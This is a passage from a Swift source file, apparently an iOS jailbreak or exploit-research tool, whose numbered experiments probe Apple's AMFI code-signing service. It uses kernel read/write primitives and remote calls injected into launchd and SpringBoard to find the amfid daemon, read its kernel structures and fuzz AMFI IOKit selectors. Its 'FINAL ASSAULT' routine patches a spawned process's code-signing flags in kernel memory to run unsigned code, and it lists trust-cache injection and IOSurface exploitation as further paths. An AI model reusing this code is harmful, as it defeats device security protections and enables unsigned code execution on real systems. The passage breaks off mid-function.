                    detail += "  âš ï¸ size=\(size): ret=0x\(String(format: "%x", ret))\n"
                }
            }
        }
        
        // Strategy 2: Try selector 2 with PID as input (4 bytes)
        // AMFI might have a "check process" method
        detail += "\n--- Selector 2 with PID input ---\n"
        sb[structInAddr].setValue32(1)  // PID 1 = launchd
        sb[structOutSizeAddr].setValue64(256)
        let pidRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 2,
                                         structInAddr, 4,
                                         structOutAddr, structOutSizeAddr)
        let pidOutSize = sb[structOutSizeAddr].value64()
        detail += "  PID=1: ret=0x\(String(format: "%x", pidRet)), outSize=\(pidOutSize)\n"
        if pidRet == 0 && pidOutSize > 0 {
            var outBuf = [UInt8](repeating: 0, count: min(Int(pidOutSize), 32))
            sb.remoteRead(structOutAddr, to: &outBuf, size: UInt64(outBuf.count))
            detail += "  output: \(outBuf.map { String(format: "%02x", $0) }.joined(separator: " "))\n"
            foundWorking.append((2, "PID input"))
        }
        
        // Strategy 3: Try selector 5 with CDHash-like input (20 bytes = SHA1)
        // This might be "add to trust cache" or "check CDHash"
        detail += "\n--- Selector 5 with CDHash input (20B zeros) ---\n"
        for i in 0..<3 { sb[structInAddr + UInt64(i * 8)].setValue64(0) }
        sb[structOutSizeAddr].setValue64(256)
        let cdRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                        UInt64(connect), 5,
                                        structInAddr, 20,
                                        structOutAddr, structOutSizeAddr)
        let cdOutSize = sb[structOutSizeAddr].value64()
        detail += "  ret=0x\(String(format: "%x", cdRet)), outSize=\(cdOutSize)\n"
        if cdRet == 0 {
            detail += "  âœ… CDHash-sized input ACCEPTED!\n"
            foundWorking.append((5, "CDHash input"))
        }
        
        // Strategy 4: Try with scalar+struct combo via IOConnectCallMethod workaround
        // Some methods need BOTH scalar and struct input
        // Use IOConnectCallScalarMethod with scalar[0] = selector-specific value
        detail += "\n--- Selector 9 with 2 scalar inputs ---\n"
        let scalarInAddr = mem + 0x2800
        sb[scalarInAddr].setValue64(1)       // arg0 = PID?
        sb[scalarInAddr + 8].setValue64(0)   // arg1 = flags?
        let scalarOutAddr = mem + 0x2A00
        let scalarOutCntAddr = mem + 0x2C00
        sb[scalarOutCntAddr].setValue32(16)
        let s9ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 9,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s9out = sb[scalarOutCntAddr].value32()
        detail += "  2 scalars [1,0]: ret=0x\(String(format: "%x", s9ret)), outCnt=\(s9out)\n"
        if s9ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((9, "2 scalar inputs"))
        }
        
        // Strategy 5: Try selector 2 with 2 scalars (PID + operation)
        detail += "\n--- Selector 2 with 2 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID 1
        sb[scalarInAddr + 8].setValue64(0)   // operation 0
        sb[scalarOutCntAddr].setValue32(16)
        let s2ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 2,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s2out = sb[scalarOutCntAddr].value32()
        detail += "  [PID=1, op=0]: ret=0x\(String(format: "%x", s2ret)), outCnt=\(s2out)\n"
        if s2ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((2, "2 scalar [PID,op]"))
        }
        
        // Strategy 6: Try selector 4 with 3 scalars
        detail += "\n--- Selector 4 with 3 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID
        sb[scalarInAddr + 8].setValue64(0)   // flags
        sb[scalarInAddr + 16].setValue64(0)  // extra
        sb[scalarOutCntAddr].setValue32(16)
        let s4ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 4,
                                        scalarInAddr, 3,
                                        scalarOutAddr, scalarOutCntAddr)
        let s4out = sb[scalarOutCntAddr].value32()
        detail += "  [1,0,0]: ret=0x\(String(format: "%x", s4ret)), outCnt=\(s4out)\n"
        if s4ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((4, "3 scalar inputs"))
        }
        
        // Close AMFI
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- RESULTS ---\n"
        detail += "Working combinations: \(foundWorking.count)\n"
        for (sel, desc) in foundWorking {
            detail += "  Selector \(sel): \(desc)\n"
        }
        if foundWorking.isEmpty {
            detail += "No working combination found yet.\n"
            detail += "Methods might need specific entitlement or token.\n"
            detail += "NEXT: try with 4,5,6 scalar inputs or larger structs\n"
        } else {
            detail += "\nðŸ”¥ FOUND WORKING AMFI METHODS!\n"
            detail += "Next: determine what each method DOES\n"
            detail += "Try: pass our binary's CDHash to whitelist it\n"
        }
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 59: AMFI from Launchd + amfid Hunt
    
    /// Experiment 59: Try AMFI IOKit from LAUNCHD context (PID 1 = most trusted)
    /// Also: find amfid daemon and try to get its task port
    /// amfid is the userspace daemon that handles AMFI policy decisions
    /// If we can control amfid â†’ we control code signing decisions!
    private func expAMFIFromLaunchd(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "AMFI from Launchd + amfid Hunt\n\n"
        let mgr = dspmgr.shared
        
        // Part 1: Try opening AMFI user client from LAUNCHD (PID 1)
        // Launchd is the most privileged userspace process
        detail += "=== Part 1: AMFI IOKit from launchd ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallScalarMethod"))
        
        var amfiConnect: UInt32 = 0
        
        if ioServiceMatching != 0 {
            let nameAddr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
            let matchDict = RootExecutor.rcall(rc, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(rc, "IOServiceGetMatchingService", 0, matchDict)
                detail += "AMFI service from launchd: 0x\(String(format: "%x", svc))\n"
                
                if svc != 0 {
                    let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
                    let connectAddr = mem + 0x1A00
                    rc[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(rc, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    amfiConnect = rc[connectAddr].value32()
                    detail += "IOServiceOpen: ret=0x\(String(format: "%x", openRet)), connect=\(amfiConnect)\n"
                    
                    if openRet == 0 && amfiConnect != 0 {
                        detail += "âœ… AMFI opened from launchd!\n\n"
                        
                        // Try selectors with different scalar counts from launchd
                        let scalarInAddr = mem + 0x2000
                        let scalarOutAddr = mem + 0x2200
                        let scalarOutCntAddr = mem + 0x2400
                        
                        // Selector 2 with 1 scalar (our PID)
                        let ourPid = RootExecutor.rcall(rc, "getpid")
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 2,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [PID=\(ourPid)]: ret=0x\(String(format: "%x", r2))\n"
                        
                        // Selector 2 with 4 scalars
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarInAddr + 8].setValue64(0)
                        rc[scalarInAddr + 16].setValue64(0)
                        rc[scalarInAddr + 24].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2b = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                     UInt64(amfiConnect), 2,
                                                     scalarInAddr, 4,
                                                     scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [4 scalars]: ret=0x\(String(format: "%x", r2b))\n"
                        
                        // Selector 5 with 1 scalar
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r5 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 5,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 5 [0]: ret=0x\(String(format: "%x", r5))\n"
                        
                        // Selector 9 with 1 scalar = 0 (might be "disable" or "query")
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r9 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 9,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 9 [0]: ret=0x\(String(format: "%x", r9))\n"
                        
                        // Check if any succeeded
                        if r2 == 0 || r2b == 0 || r5 == 0 || r9 == 0 {
                            detail += "\nðŸ”¥ðŸ”¥ðŸ”¥ LAUNCHD HAS AMFI ACCESS!\n"
                            let outVal = rc[scalarOutAddr].value64()
                            detail += "output[0] = 0x\(String(format: "%llx", outVal))\n"
                        } else {
                            detail += "\nLaunchd also rejected â€” needs specific entitlement\n"
                        }
                        
                        // Close
                        RootExecutor.rcall(rc, "IOServiceClose", UInt64(amfiConnect))
                    } else {
                        detail += "âŒ Cannot open AMFI from launchd\n"
                    }
                }
            }
            RootExecutor.rcall(rc, "free", remote_alloc_str(rc, "AppleMobileFileIntegrity"))
        } else {
            detail += "IOKit not loaded in launchd\n"
        }
        
        // Part 2: Find amfid daemon
        detail += "\n=== Part 2: Hunt for amfid ===\n"
        
        // amfid is the AMFI daemon â€” it makes code signing decisions
        // If we can find it and RC into it, we have full AMFI control
        let amfidProc = mgr.findProc(name: "amfid")
        detail += "amfid proc in kernel: 0x\(String(format: "%llx", amfidProc))\n"
        
        if amfidProc != 0 {
            // Read amfid's PID
            let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
            detail += "amfid PID: \(amfidPid)\n"
            
            // Read amfid's proc_ro â†’ task
            let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
            let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
            detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
            detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"
            
            // Read amfid's cs_flags
            let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
            detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
            if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
            if amfidCSFlags & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
            
            detail += "\nâœ… amfid FOUND! PID=\(amfidPid)\n"
            detail += "amfid is the code signing policy daemon.\n"
            detail += "If we can RC into amfid â†’ full AMFI control!\n"
            detail += "NEXT: try RemoteCall init to amfid process\n"
        } else {
            detail += "amfid not found in process list\n"
            detail += "Trying to find via name scan...\n"
            
            // Scan process list for amfi-related processes
            let procs = ["amfid", "trustd", "securityd", "syspolicyd"]
            for name in procs {
                let proc = mgr.findProc(name: name)
                if proc != 0 {
                    let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                    detail += "  \(name): PID=\(pid), proc=0x\(String(format: "%llx", proc))\n"
                }
            }
        }
        
        // Part 3: Trust Cache research
        detail += "\n=== Part 3: Trust Cache Info ===\n"
        detail += "Trust caches are kernel-resident lists of allowed CDHashes.\n"
        detail += "If we can ADD our binary's CDHash to a trust cache â†’ bypass AMFI!\n"
        detail += "Trust cache structs are in kernel heap (kalloc zone).\n"
        detail += "Our socket KRW might not reach them, but worth investigating.\n"
        
        // Try to find trust cache pointer via sysctl
        let tcNameAddr = remote_alloc_str(rc, "security.mac.amfi.trust_cache_count")
        let tcBufAddr = mem + 0x2800
        let tcSizeAddr = mem + 0x2A00
        rc[tcSizeAddr].setValue64(8)
        let tcRet = RootExecutor.rcall(rc, "sysctlbyname", tcNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if tcRet == 0 {
            let tcCount = rc[tcBufAddr].value64()
            detail += "Trust cache count: \(tcCount)\n"
        } else {
            detail += "trust_cache_count sysctl: ret=\(tcRet) (not available)\n"
        }
        RootExecutor.rcall(rc, "free", tcNameAddr)
        
        // Try amfi.developer_mode_status
        let devNameAddr = remote_alloc_str(rc, "security.mac.amfi.developer_mode_status")
        rc[tcSizeAddr].setValue64(4)
        let devRet = RootExecutor.rcall(rc, "sysctlbyname", devNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if devRet == 0 {
            let devMode = rc[tcBufAddr].value32()
            detail += "Developer mode: \(devMode)\n"
        } else {
            detail += "developer_mode_status: ret=\(devRet)\n"
        }
        RootExecutor.rcall(rc, "free", devNameAddr)
        
        let success = amfidProc != 0 || (amfiConnect != 0)
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI launchd+amfid", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: RemoteCall into amfid
    
    /// Experiment 60: Initialize RemoteCall into amfid daemon!
    /// amfid (PID 52) is the code signing policy daemon.
    /// It has the entitlements needed to call AMFI IOKit methods.
    /// If we can RC into amfid â†’ call AMFI methods FROM amfid â†’ bypass!
    ///
    /// Strategy:
    /// 1. Find amfid PID (already found: 52)
    /// 2. Use dspmgr.rcinit(process: "amfid") to establish RemoteCall
    /// 3. From amfid context: call IOConnectCallScalarMethod on AMFI
    /// 4. amfid has com.apple.private.amfi.can-execute entitlement!
    private func expRCIntoAmfid(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        var detail = "ðŸ”¥ amfid Kernel Research\n\n"
        
        // RC to amfid HANGS (confirmed â€” single-threaded daemon)
        // Direct task struct reads PANIC (itk_space, threads in wrong zone)
        // Only safe reads: proc, proc_ro, pid, cs_flags
        
        // Step 1: Find amfid
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "âŒ amfid not found in process list\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
        
        // Step 2: Read proc_ro (SAFE â€” same zone as proc)
        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
        
        // Step 3: Read cs_flags (SAFE â€” in proc_ro)
        let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
        detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
        if amfidCSFlags & 0x001 != 0 { detail += "  CS_VALID\n" }
        if amfidCSFlags & 0x004 != 0 { detail += "  CS_HARD\n" }
        if amfidCSFlags & 0x008 != 0 { detail += "  CS_KILL\n" }
        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
        
        // Step 4: Read p_flag (SAFE)
        let amfidPFlag = ds_kread32(amfidProc + UInt64(off_proc_p_flag))
        detail += "amfid p_flag: 0x\(String(format: "%x", amfidPFlag))\n"
        
        // Step 5: Read task pointer (SAFE to read pointer, NOT safe to dereference task internals)
        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "amfid task ptr: 0x\(String(format: "%llx", amfidTask))\n"
        detail += "âš ï¸ Cannot read task internals (itk_space, threads â†’ panic)\n"
        
        // Step 6: Read ucred (SAFE â€” pointer in proc_ro)
        var ucredAddr: UInt64 = 0
        if amfidProcRo != 0 {
            ucredAddr = ds_kread64(amfidProcRo + UInt64(off_proc_ro_p_ucred))
            detail += "amfid ucred: 0x\(String(format: "%llx", ucredAddr))\n"
            
            // Read uid from ucred (offset 0x18 is cr_uid typically)
            if ucredAddr != 0 {
                let uid = ds_kread32(ucredAddr + 0x18)
                detail += "amfid uid: \(uid)\n"
            }
        }
        
        // Step 7: Read p_textvp (vnode of amfid binary)
        let textVP = ds_kread64(amfidProc + UInt64(off_proc_p_textvp))
        detail += "amfid textvp: 0x\(String(format: "%llx", textVP))\n"
        
        // Step 8: Read process name
        var nameBuf = [UInt8](repeating: 0, count: 32)
        let nameAddr = amfidProc + UInt64(off_proc_p_name)
        for i in 0..<32 {
            nameBuf[i] = ds_kread8(nameAddr + UInt64(i))
            if nameBuf[i] == 0 { break }
        }
        let procName = String(bytes: nameBuf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
        detail += "amfid name: \(procName)\n"
        
        // Step 9: Also find trustd and securityd
        detail += "\n=== Related daemons ===\n"
        let relatedProcs = ["trustd", "securityd", "syspolicyd"]
        for name in relatedProcs {
            let proc = mgr.findProc(name: name)
            if proc != 0 {
                let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                let csf = mgr.readCSFlags(pid: Int32(bitPattern: pid))
                detail += "\(name): PID=\(pid), cs=0x\(String(format: "%x", csf))"
                if csf & 0x100 != 0 { detail += " [PLATFORM]" }
                detail += "\n"
            }
        }
        
        detail += "\n=== CONCLUSION ===\n"
        detail += "RC to amfid: âŒ IMPOSSIBLE (hangs â€” single-threaded)\n"
        detail += "Task internals: âŒ INACCESSIBLE (wrong kernel zone)\n"
        detail += "amfid is CS_PLATFORM_BINARY with uid=0\n\n"
        detail += "Remaining AMFI bypass paths:\n"
        detail += "â€¢ Trust cache injection (find TC struct in kernel heap)\n"
        detail += "â€¢ IOSurface external method exploitation\n"
        detail += "â€¢ Kernel function hooking (if we find writable code)\n"
        detail += "â€¢ Developer mode exploitation (already enabled!)\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: true, detail: detail, timestamp: Date())
    }
    
    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: ALL REMAINING PATHS
    
    /// Experiment 61: Combined final assault â€” all remaining bypass paths in one
    /// 1. Trust Cache scan (find TC linked list via known kernel symbols)
    /// 2. Developer mode spawn (special flags for dev-mode enabled devices)
    /// 3. posix_spawn with responsibility_spawnattrs (launchd managed spawn)
    /// 4. IOSurface external method 9/10 (getValue/setValue on kernel objects)
    /// 5. Spawn with CS_DEBUGGED patched on child process
    private func expFinalAssault(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "ðŸ”¥ FINAL ASSAULT â€” All remaining paths\n\n"
        var anySuccess = false
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 1: Developer Mode Spawn
        // Developer mode = 1 (confirmed). On iOS 16+, dev mode
        // allows some unsigned code execution for development.
        // Try: posix_spawnattr with _POSIX_SPAWN_DISABLE_ASLR + persona
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "â•â•â• PATH 1: Developer Mode Spawn â•â•â•\n"
        
        // Copy binary first
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_devmode_test")
        RootExecutor.rcall(rc, "unlink", dstPath)
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        
        // Try spawn with various "developer" flags
        let devFlags: [(String, UInt64)] = [
            ("DISABLE_ASLR (0x100)", 0x0100),
            ("SETEXEC (0x40)", 0x0040),
            ("SETPGROUP|SETSID|DISABLE_ASLR", 0x0502),
            ("CLOEXEC_DEFAULT|DISABLE_ASLR", 0x1100),
        ]
        
        for (name, flags) in devFlags {
            let attrAddr = mem + 0x1800
            rc[attrAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
            
            let argvBase = mem + 0x1C00
            rc[argvBase].setValue64(dstPath)
            rc[argvBase + 8].setValue64(0)
            let pidAddr = mem + 0x1E00
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
            RootExecutor.rcall(rc, "usleep", 300000)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
            
            detail += "  \(name): ret=\(ret)\n"
            if ret == 0 {
                detail += "  ðŸŽ‰ SPAWN SUCCESS!\n"
                anySuccess = true
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 2: CS_DEBUGGED on child before exec
        // Fork child â†’ patch its cs_flags to add CS_DEBUGGED â†’ then spawn
        // CS_DEBUGGED tells AMFI "debugger attached, relax checks"
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 2: CS_DEBUGGED patch + spawn â•â•â•\n"
        
        // Fork to create child
        let childPid = RootExecutor.rcall(rc, "fork")
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            detail += "Forked child PID: \(childPid)\n"
            
            // Patch child's cs_flags to add CS_DEBUGGED (0x800) + CS_GET_TASK_ALLOW (0x4000)
            // Also remove CS_HARD (0x4) and CS_KILL (0x8)
            let childProc = mgr.findProc(pid: Int32(childPid))
            if childProc != 0 {
                let childProcRo = ds_kread64(childProc + UInt64(off_proc_p_proc_ro))
                if childProcRo != 0 {
                    let currentFlags = ds_kread32(childProcRo + 0x1c)
                    // Add CS_DEBUGGED | CS_GET_TASK_ALLOW, remove CS_HARD | CS_KILL
                    let newFlags = (currentFlags | 0x4800) & ~UInt32(0x000C)
                    ds_kwrite32(childProcRo + 0x1c, newFlags)
                    let afterFlags = ds_kread32(childProcRo + 0x1c)
                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) â†’ 0x\(String(format: "%x", afterFlags))\n"
                    
                    if afterFlags != currentFlags {
                        detail += "âœ… CS_DEBUGGED patched on child!\n"
                    }
                }
            }
            
            // Kill child (it's just a fork copy, not useful yet)
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
            
            // Now: spawn the copied binary â€” AMFI checks the NEW process
            // Patch cs_flags AFTER spawn (race condition approach)
            detail += "\nSpawn + immediate cs_flags patch (race)...\n"
            let argvBase2 = mem + 0x1C00
            rc[argvBase2].setValue64(dstPath)
            rc[argvBase2 + 8].setValue64(0)
            let pidAddr2 = mem + 0x1E00
            rc[pidAddr2].setValue64(0)
            
            // Spawn with START_SUSPENDED so we can patch before it runs
            let attrAddr2 = mem + 0x1800
            rc[attrAddr2].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr2)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr2, 0x0080) // POSIX_SPAWN_START_SUSPENDED
            
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, attrAddr2, argvBase2, 0)
            let spawnedPid = rc[pidAddr2].value32()
            detail += "Spawn (SUSPENDED): ret=\(spawnRet), pid=\(spawnedPid)\n"
            
            if spawnRet == 0 && spawnedPid != 0 {
                // Process is suspended! Patch its cs_flags NOW
                let spawnedProc = mgr.findProc(pid: Int32(spawnedPid))
                if spawnedProc != 0 {
                    let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
                    if spProcRo != 0 {
                        let spFlags = ds_kread32(spProcRo + 0x1c)
                        let spNewFlags = (spFlags | 0x4800) & ~UInt32(0x000C) // +DEBUGGED +GET_TASK_ALLOW -HARD -KILL
                        ds_kwrite32(spProcRo + 0x1c, spNewFlags)
                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) â†’ 0x\(String(format: "%x", spNewFlags))\n"
                    }
                }
                
                // Resume the process
                RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 18) // SIGCONT
                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
                
                // Check if it's still alive (not killed by AMFI)
                let statusAddr = mem + 0x380
                rc[statusAddr].setValue32(0)
                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, UInt64(WNOHANG))
                let status = rc[statusAddr].value32()
                
                detail += "After resume: waitpid=\(waitRet), status=0x\(String(format: "%x", status))\n"
                
                let exited = (status & 0x7F) == 0
                let exitCode = (status >> 8) & 0xFF
                let signaled = (status & 0x7F) != 0 && (status & 0x7F) != 0x7F
                let sig = status & 0x7F
                
                if exited && exitCode == 0 {
                    detail += "ðŸŽ‰ðŸŽ‰ðŸŽ‰ PROCESS RAN AND EXITED NORMALLY! ðŸŽ‰ðŸŽ‰ðŸŽ‰\n"
                    detail += "CS_DEBUGGED BYPASS WORKS!\n"
                    anySuccess = true
                } else if signaled && sig == 9 {
                    detail += "âŒ Killed by SIGKILL (AMFI still enforcing)\n"
                } else if waitRet == 0 {
                    detail += "Process still running (not reaped yet)\n"
                    RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 9)
                    RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, 0)
                } else {
                    detail += "status=0x\(String(format: "%x", status)) (exit=\(exitCode), sig=\(sig))\n"
                }
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr2)
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 3: Trust Cache â€” DISABLED (neighbor scan causes panic)
        // Reading arbitrary addresses near pmap_cs hits inaccessible zones
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 3: Trust Cache scan â•â•â•\n"
        detail += "âš ï¸ DISABLED â€” scanning kernel memory near pmap_cs causes panic\n"
        detail += "Socket KRW cannot safely read arbitrary __DATA addresses\n"
        let _ = [] as [(Int, UInt64)]
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 4: IOSurface external method 9 (getValue)
        // IOSurface user client has methods that read/write kernel objects
        // Selector 9 = s_get_value, Selector 10 = s_set_value
        // These operate on IOSurface properties in kernel heap!
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 4: IOSurface getValue/setValue â•â•â•\n"
        
        guard let sb = dspmgr.shared.sbProc else {
            detail += "No SpringBoard RC\n"
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
        }
        
        let sbMem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Open IOSurfaceRoot user client
        let ioSvcName = remote_alloc_str(sb, "IOSurfaceRoot")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", ioSvcName)
        let ioSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
